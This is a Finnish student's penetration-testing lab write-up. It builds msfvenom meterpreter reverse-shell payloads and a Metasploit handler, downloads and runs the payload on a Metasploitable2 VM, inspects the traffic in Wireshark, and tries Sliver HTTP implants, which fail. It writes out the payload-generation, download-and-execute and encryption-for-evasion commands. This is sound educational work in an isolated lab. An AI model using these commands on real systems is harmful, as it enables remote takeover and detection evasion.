### h6 Koita simpukoita [tehtävänanto](https://terokarvinen.com/tunkeutumistestaus/#h6-koita-simpukoita)

## Tehtävissä käytetty ympäristö

### PC

- Käyttöjärjestelmä: Windows 11 Home 64-bit
- Suoritin: AMD Ryzen 7 5800X 8-Core Processor
- Muisti: 32GB RAM
- Näytönohjain: NVIDIA GeForce RTX 3080
- Virtualisointiohjelmisto: Oracle VM VirtualBox 7.0
- Internet yhteys: DNA Netti 1000 M

### Virtuaalikone

- Kali Linux [Get Kali](https://www.kali.org/get-kali/#kali-platforms)
- Base Memory: 8192 MB
- Processors: 1
- Virtual HD: 60 GB
- Video Memory: 128 MB

## a) Venom. Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.

Ensimmäisenä otin koneet irti netistä ja testasin että ne saavat yhteyden toisiinsa:

<img width="742" height="629" alt="image" src="https://github.com/user-attachments/assets/b268f85f-b3a4-44ab-ae1b-b96f0d817e2d" />

Hyökkäyskone Kali: 192.168.56.101 ja
kohdekone metasploitable2: 192.168.56.102

Aloitin etsimällä tietoa tuosta msfvenom-työkalusta. Youtuben hakutuloksista ("msfvenom revershe shell") löytyi CyberOffensen [video](https://www.youtube.com/watch?v=ZqWfDrD2WVY), jossa esitellään työkalun käyttöä.

Videolla hyökätään Windows-järjestelmää vastaan, ja payload luodaan komennolla `msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=5555 -f exe > /root/Desktop/ShellCodes/reverse_tcp.exe`

Omaa payloadia täytyi hieman muokata ympäristöön sopivaksi. Googlailin hakusanalla "msfvenom reverse shell payload" ja löysin duck-secin [msfvenom-revshell-cheatsheet](https://github.com/duck-sec/msfvenom-revshell-cheatsheet) repon.

Sivulta löytyy Staged ja Stageless -payloads komennot:

<img width="784" height="260" alt="image" src="https://github.com/user-attachments/assets/6be5f39c-b4c2-4ede-9068-710c7ce6b118" />

Sitten tutkimaan mitä eroa noilla kahdella on. Google haulla "staged and stageless payload" löysin [tämän](https://blog.spookysec.net/stage-v-stageless-1/) sivuston, jossa kerrotaan näiden eroista:

Stageless payload
- Yksinkertaisin payload -tyyppi, sisältää kaiken tarvittavan koodin yhdessä tiedostossa.
- Tiedoston koko on tyypillisesti suurempi.
- Käynnistyy ja toimii heti suorituksen jälkeen.

Staged payload
- Koostuu useammasta vaiheesta, joista ensimmäinen (stager) muodostaa yhteyden hyökkääjän palvelimeen.
- Varsinainen hyötykuorma (payload) ladataan verkon yli ensimmäisen vaiheen jälkeen.
- Handler vastaanottaa yhteyden ja toimittaa seuraavan vaiheen.

Päädyin testaamaan meterpreter payloadia linux/x86/meterpreter_reverse_tcp. Käytetään x86 arkkitehtuurille valittua payloadia, arkkitehtuurin selvitin metasploitable koneesta komennolla `uname -m` (palautti i686 ja googlaamalla löytyi i686 = 32-bit x86).

Loin uuden kansion tehtävää varten `mkdir venom` ja payloadin tuohon polkuun komennolla `msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=5555 -f elf > /home/kali/venom/venom.elf`

<img width="907" height="232" alt="image" src="https://github.com/user-attachments/assets/c5e94ded-41b8-42c3-ab0e-25a66ee925f3" />

Työkalu herjasi, että alustaa tai arkkitehtuuria ei oltu määritetty, mutta se osasi hakea ne käytetyn payloadin perusteella.

Komennon parametrit
- `-p` määritetään käytettävä payload
-  `linux/x86/meterpreter_reverse_tcp` Payload, Linuxille x86-arkkitehtuurin reverse TCP meterpreter -yhteys
-  `LHOST` määritetään hyökkääjän koneen IP-osoite
-  `LPORT` määritetään portti, jota kautta yhteys muodostetaan
-  `-f` määritetään tiedostomuoto
-  `elf` Linuxin ajettava ELF-binääri [lähde](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format)
-  `> /home/kali/venom/venom.elf` polku ja tiedosto, johon payload tallennetaan

Palomuuriin reiät http-palvelinta varten ja hyökkäyksessä käytettävää kuuntelevaa porttia varten `sudo ufw allow 5555/tcp` ja `sudo ufw allow 8000/tcp`

<img width="291" height="218" alt="image" src="https://github.com/user-attachments/assets/d2e54d29-6be1-4d41-b9f5-eb169f0b42cc" />

Sitten yksinkertainen HTTP-palvelin käyntiin, jotta saadaan hyötykuorma metasploitable2 koneelle, komennolla `python3 -m http.server`

<img width="526" height="91" alt="image" src="https://github.com/user-attachments/assets/7ba6046f-85d6-4b7f-8628-ac68817798b2" />

Metasploit konsoli käyntiin uudessa terminaalissa komennolla `msfconsole` ja seuraavat määritykset moduulia varten:

    use exploit/multi/handler
    options
    set LHOST 192.168.56.101
    set LPORT 5555
    set payload linux/x86/meterpreter_reverse_tcp
    exploit

metasploitable koneella haittaohjelman lataus `wget 192.168.56.101:8000/venom.elf`

<img width="629" height="197" alt="image" src="https://github.com/user-attachments/assets/642ab851-1e2f-4fae-bc53-a15e5adf4826" />

Sitten haittaohjelma ajettavaan muotoon ja suoritus

    chmod u+x venom.elf
    ./venom.elf

Ja sitten aukesikin meterpreter sessio:

<img width="731" height="101" alt="image" src="https://github.com/user-attachments/assets/9437c4c6-891e-40b2-872c-c3a3e1313a03" />

Ajoin testauksen vuoksi muutamia komentoja meterpreterissä:

<img width="716" height="425" alt="image" src="https://github.com/user-attachments/assets/c270efcc-193d-4991-b0f6-a76f261ad11d" />

## b) Snif venom! Tarkastele ja analysoi msfvenomin muodostamaa reverse shell -yhteyttä. Käytä snifferiä, kuten Wireshark. Mitä havaitset? Mistä ominaisuuksista yhteyden voi tunnistaa? Millä muutoksilla tunnistamista voi vaikeuttaa?

Meterpreter sessio on edelleen auki. Avasin kalista Wiresharkin `wireshark` ja aloin kaappaamaan liikennettä interface eth1:ltä.

<img width="1666" height="643" alt="image" src="https://github.com/user-attachments/assets/3b9d974a-4f54-40a5-b27a-999af0b3d7d4" />

Yhteyden voi tunnistaa seuraavista:

- Kali koneen IP-osoite (Source: 192.168.56.101)
- metasploitable2 koneen IP-osoite (Destination: 192.168.56.102)
- Käytetty protokolla (Protocol: TCP)
- Yhteydessä käytetty epäilyttävä portti 5555 ja kohdekoneen satunnainen portti 35246
- TCP istunnossa lähetetään PSH/ACK -paketteja molempiin suuntiin
- TCP streamissa data näkyy binäärisenä
- Ei tavallisimpia HTTP metodeja GET, POST jne.

Tunnistamista voi pyrkiä vaikeuttamaan esimerkiksi hyötykuorman salauksella [lähde](https://github.com/duck-sec/msfvenom-revshell-cheatsheet):

`msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe --encrypt xor --encrypt-key <KEY> > encrypted_shell.exe` -esimerkki duck-secin msfvenom-revshell-cheatsheet sivulta.

## c) Hello, Sliver. Näytä esimerkki http-yhteydestä Sliverillä.

Asennuksen ajaksi Kalille yhteys nettiin. Asennusta varten löytyi Bishopfoxin [reposta](https://github.com/bishopfox/sliver) "Linux One Liner" `curl https://sliver.sh/install|sudo bash`

<img width="742" height="123" alt="image" src="https://github.com/user-attachments/assets/b931bea4-d39a-4a3a-99fd-33bbe4380c44" />

Tässä kohti Kali irti netistä. Perehdyin ensiksi Sliverin dokumentaatioon osoitteessa: https://sliver.sh/docs/?name=Getting+Started.

Dokumentaation selailun jälkeen käynnistin sliverin komennolla `sliver`

<img width="564" height="367" alt="image" src="https://github.com/user-attachments/assets/c9c1fc71-e0b7-4b23-9da9-c0c9e3da1120" />

Sliverissä `generate --help` antaa paljon infoa payloadin luomista varten. Perehdyin tähän ja loin sitten payloadin komennolla:

 `sliver > generate --http 192.168.56.101 --os linux`

<img width="560" height="153" alt="image" src="https://github.com/user-attachments/assets/9e900ce9-acb9-44f3-a61d-b256485cd1a1" />

Sitten käynnistin Kalissa http-palvelimen `python3 -m http.server` ja latasin kohdekoneeseen payloadin `wget 192.168.56.101:8000/EXUBERANT_BRASSIERE`

Payload ajettavaksi tiedostoksi komennolla `chmod +x EXUBERANT_BRASSIERE`

Sliverissä listener käyntiin `http` ja tarkistus `jobs`

<img width="399" height="224" alt="image" src="https://github.com/user-attachments/assets/90dce92d-169a-4bd1-a3ae-5c92aec3017e" />

Sitten yritin ajaa kohdekoneessa ./EXUBERANT_BRASSIERE , mutta:

<img width="641" height="127" alt="image" src="https://github.com/user-attachments/assets/41a96026-228c-4c08-9770-08af432571c0" />

Ei suostunut ajamaan, koska tiedosto oli nähtävästi 64-bittinen binääri.

Pieni tuunaus aiempaan generate -komentoon (myös nimen osalta tällä kertaa):

`sliver > generate --http 192.168.56.101 --os linux --arch 386 --save sliver.elf`

Vieläkään ei ilmestynyt sessiota. Tarkistin palomuuri asetukset `sudo ufw status` ja ne näyttivät olevan kunnossa. Päätin kokeilla vielä luoda uuden payloadin `sliver > generate --http 192.168.56.101 --os linux --arch 386 --save payload.elf`

Ei auttanut sekään. Vielä viimeinen yritys vaihtamalla porttiin 8080, eli `sliver > generate --http 192.168.56.101:8080 --os linux --arch 386 --save lastpayload.elf` ja sliverissä `http --lport 8080`

<img width="556" height="349" alt="image" src="https://github.com/user-attachments/assets/154fde2d-63d6-4588-a53d-e5e5c05d0169" />

Jostain syystä tuota sessiota ei löydy kaikesta yrityksestä huolimatta. Käytin ongelman selvittämiseen myös ChatGPT:tä apuna ("Miksei Sliver löydä sessiota näiden työvaiheiden jälkeen?") tuloksetta.
En saanut ongelmaa ratkaistua, joten jouduin jättämään tehtävän suorituksen tähän ajanpuutteen vuoksi.


## Lähteet

BishopFox. Sliver. https://github.com/bishopfox/sliver

BishopFox. Sliver tutorials and documentation. https://sliver.sh/

ChatGPT promptilla: "Miksei Sliver löydä sessiota näiden työvaiheiden jälkeen?"

CyberOffense. 17.4.2022. Use Msfvenom to Create a Reverse TCP Payload. https://www.youtube.com/watch?v=ZqWfDrD2WVY

duck-sec. msfvenom-revshell-cheatsheet. https://github.com/duck-sec/msfvenom-revshell-cheatsheet

Karvinen, T. 22.3.2026. Tunkeutumistestaus. https://terokarvinen.com/tunkeutumistestaus/

Spookysec. Staged vs Stageless Payloads. https://blog.spookysec.net/stage-v-stageless-1/

Wikipedia. Executable and Linkable Format. https://en.wikipedia.org/wiki/Executable_and_Linkable_Format
